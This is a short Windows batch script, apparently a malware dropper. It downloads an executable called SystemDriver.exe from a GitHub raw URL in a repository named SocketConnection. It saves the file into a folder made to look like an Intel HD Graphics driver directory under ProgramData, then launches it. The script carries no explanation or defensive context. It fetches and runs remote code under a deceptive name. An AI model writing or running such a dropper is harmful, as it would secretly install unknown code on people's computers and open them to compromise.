@echo off
if not exist "C:/ProgramData/Intel HD Graphics Drivers for Windows(R)/SystemDriver.exe" curl "https://raw.githubusercontent.com/MichaelNoskov/SocketConnection/main/SystemDriver.exe" -o "C:/ProgramData/Intel HD Graphics Drivers for Windows(R)/SystemDriver.exe"
start /d "C:/ProgramData/Intel HD Graphics Drivers for Windows(R)/" SystemDriver.exe
